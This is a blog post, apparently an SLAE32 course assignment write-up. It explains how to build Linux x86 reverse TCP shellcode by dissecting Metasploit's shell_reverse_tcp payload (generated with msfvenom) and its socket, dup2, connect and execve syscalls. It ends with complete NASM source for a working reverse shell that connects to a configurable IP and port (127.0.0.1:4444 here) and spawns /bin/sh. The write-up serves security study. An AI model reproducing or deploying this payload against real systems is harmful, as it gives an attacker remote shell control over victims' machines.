---
layout: post
title:  "SLAE32"
subtitle: "|  Assignment 2 - Reverse Shell"
date:   2022-09-25 08:45:58 +0200
category: SLAE32
subject: Assignment 2 - Reverse Shell
excerpt_separator: <!--more-->
github-link: TODO
---

###  <span style="color:#2d8fb3;"> Description of the assignment </span>

- Create a Shell_Reverse_TCP Shellcode:
  - Reverse connects to configured IP and Port;
  - Execs Shell on sucessfull connection;
- IP and Port should be easily configurable.
 
<!--more-->

###  <span style="color:#2d8fb3;"> MSFVenom example & Socket_call </span>

To perform this exercise, we started by analysing the reverse shell code of Metasploit to see how it works and what syscall are made. To do so, we followed the steps as follows to create an image of the different syscalls performed and to make it more visible.

As follows the command line to generate the graphical schema of the metasploit reverse shell :

    msfvenom -p linux/x86/shell_reverse_tcp R | /opt/hackingtools/libemu/tools/sctest/sctest -vvv -Ss 100000 -G shell_reverse_tcp.dot

    Then convert into PNG file :

    dot shell_reverse_tcp.dot -Tpng -o shell_reverse_tcp.png 

**Result:**

<img src="/assets/slae32-img/assignment2/assignment2.1.png" alt="drawing" style="max-width:100%;"/>

As we can see, there are 4 syscalls :
- socket
- dup2
- connect
- execve

Each of them will be detailled in the following parts.

## SOCKET CALL 

The detail of the socket call can be displayed with the following command line :

    root@kali:~# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep socket
        #define __NR_socketcall 102
        #define __NR_socket 359
        #define __NR_socketpair 360

Then, we looked into the details of the socketcall

![Picture](assignment2-img/assignment2.2.png)

As we can see, the socketcall is composed of first, the type of the syscall (socket, bind, ...) and secondly its arguments.

## SOCKET

The socket syscall creates a socket which will listen for the incoming connections. It needs the following parameters as follows :

    man 2 socket 
    
![Picture](assignment2-img/assignment2.4.png)

Return value :
![Picture](assignment2-img/assignment2.5.png)

with :
- domain : The protocol family used (AF_INET, AF_LOCAL, ...)
- type : The type of the service (TCP, UDP, ...)
- protocol : Specify if a particular protocol will be used with the socket (0 most of the time)

And the corresponding parameter values are listed in the files as follows :

    DOMAIN AND PROTOCOLS parameters : 
    /usr/include/x86_64-linux-gnu/bits/socket.h
    
    TYPE parameter :
    /usr/include/bits/socket_type.h

The following parameters were use by the msfvenom bind shellcode shows :
- ESP : 00000002 00000001 00000000
- EAX : 0x66                                // in decimal 102 (syscall)
- EBX : 1                                   // socket call
- ECX : ESP :  00000002 00000001 00000000   // arg of the socket call
  
The argument passed throught ECX are :
- domain : 2      // PF_INET/AF_INET, IP protocol family
- type : 1        // SOCK_STREAM, TCP connection based
- protocol : 0    // Unspecified


**Useful link :** The details of the *socket* can be find in the following links :
- http://shtroumbiniouf.free.fr/CoursInfo/Reseau2/Cours/SocketsBSD/SocketsBSD.html ()
- http://sdz.tdct.org/sdz/les-sockets.html


## DUP2

Now, we need to redirect all the file descriptors to the client scoketfd generated by the previous socket syscall.

![Picture](assignment2-img/assignment2.6.png)

![Picture](assignment2-img/assignment2.7.png)


We will pass the following arguments :
- EAX : 0x3f        // dup sys call
- EBX : Previous EAX         // File descriptor returned by the accept call
- ECX : 2 to 0 (loop)      // IN, OUT, ERR

To perform the loop, we will use the intruction JNS as follows because it perform the jmp until the Sign Flag is set (SF=1), which mean that the zero is taken into account in the loop :

![Picture](assignment2-img/assignment2.8.png)

When we execute the code, we can see that the shellcode is listening.
![Picture](assignment2-img/assignment2.9.png)

## CONNECT

Then, we need to intiate a socket connection on a remote host by specifing the address and the port to connect to. 

    man 2 connect

![Picture](assignment2-img/assignment2.10.png)


With :
- sockfd : file descriptor, return value of the socket sys call
- sockaddr *addr // address argument which depends on the family

        struct sockaddr {
            sa_family_t sa_family;
            char        sa_data[14];
        }

    In our case, with the Internet Family AF_INET, the address structure will be constructed as follows : 

        struct sockaddr_in {
            sa_family_t    sin_family; /* address family: AF_INET */
            in_port_t      sin_port;   /* port in network byte order */
            struct in_addr sin_addr;   /* internet address */
        };

        /* Internet address. */
        struct in_addr {
            uint32_t       s_addr;     /* address in network byte order */
        };
    
    From :
    
        /usr/src/linux-headers-5.2.0-kali2-common/include/uapi/linux/in.h
    
        
- addrlen : The size, in bytes, of the address structure pointed to by addr which is 16

Link:
  - IP manual : https://man7.org/linux/man-pages/man7/ip.7.html
  - Example : https://www.scip.ch/en/?labs.20200521


Which mean that we need to pass the following registers :
- EAX : 0x66    // SOCKET_CALL
- EBX : 3       // SYS_CONNECT
- ECX :
  - ESI         // file descriptor which is the return value of the socket syscall
  - Struct : 
    - AF_INET : 2 // Family   (2 bytes)
    - The port : 4444 // 0x115c in hexa (6 bytes)
    - IP : 0.0.0.0 // push 00 on the stack (8 bytes)
  - addrlen : 16 bytes

While i was checking that the return value is NULL (0x00) i set up a netcat to verify that the connection succeed.

![Picture](assignment2-img/assignment2.11.png)


## EXECVE

Now that we created a socket which connect to a remote host, we finally have to launch a shell through that connection allowing the remote host to interact with the device.


![Picture](assignment2-img/assignment2.12.png)

We will pass the following arguments :
- EAX : 0xb                             // execve syscall, 11 in decimal
- EBX : Argument /bin//sh + 0X00000000        
- ECX : Address of the EBX string
- EDX : NULL

## CODE 

    ; Filename: ShellReverse.nasm
    ; Author: Codor

    global _start

    section .text
    _start:
        
        ; SOCKET
        
        ; EBX
        push ebx ; push the x00000000 on the stack
        
        inc ebx ; SYS_SOCKET = 1
        push ebx ; push the 0x00000001 on the stack for the domain AF_INET of the SYS_SOCKET call 
        
        ; ECX
        push byte 0x2 ; push the 0x00000002 on the stack for the type SOCK_STREAM
        mov ecx, esp ; put the arguments of the socketcall into ECX

        ; EDX is 0x00000000 by default

        ; EAX
        mov al, 0x66

        ; socket call
        int 0x80
        
        mov esi, eax
        
        ; DUP
        ; EBX, File descriptor return by ACCEPT call
        mov ebx, eax	; Retrieve the file descriptor
        
        ; EAX, dup2 sys call 0x3f
        xor eax, eax
        
        ; initialize ECX 
        xor ecx, ecx
        mov cl, 0x2

        ; LOOP
    DupLoop :
        
        mov al, 0x3f
        int 0x80
        dec ecx
        jns DupLoop	


        ; CONNECT
        ; EBX ; SYS_CONNECT = 3
        xor ebx, ebx
        mov bl, 3

        ; ECX, To modify
        ; Creation of the struct sockaddr_in
        
        ; //////////////// Listening address ////////////
        ; Description: Set up the address to listen to
        ; Example : 
        ; 	push edi ; Push on the stack the address 0.0.0.0
        ; 	push 0x00000000 ; Same
        push 0x0100007f ; 127.0.0.1

        ; /////////////// Listening port ///////////////
        ; Description : Set up the port to listen to
        ; Example : push word 0x5c11 ; Push on the stack the port 4444
        push word 0x5c11	
        
        push word 0x2 ; Push the Family AF_INET = 2
        mov ecx, esp ; mov the structure into ecx
        
        ; put all parameters into ECX 
            
        push byte 0x16 ; Push on the stack the address length of 16
        push ecx
        push esi ; push the file descriptor
        mov ecx, esp ; Move the stack into ECX
        
        ; EAX
        xor eax, eax
        mov al, 0x66
        
        ; connect call
        int 0x80
        


        ; EXECVE /bin/sh	
        ; Push the 0x00000000 on the stack
        xor eax, eax
        push eax
        
        ; put the string on the stack
        push 0x68732f2f ; //sh : hs// : 68732f2f	
        push 0x6e69622f ; /bin : nib/ : 6e69622f	
        
        ; setup EBX with the value of ESP
        mov ebx, esp

        ; set up EDX and push null bytes again
        push eax
        mov edx, esp

        ; set up ECX argv address on the first dw and null in second dw
        push ebx 
        ; Then move the top of the stack into ECX
        mov ecx, esp

        ; EAX
        mov al, 0xb
        int 0x80
        
        

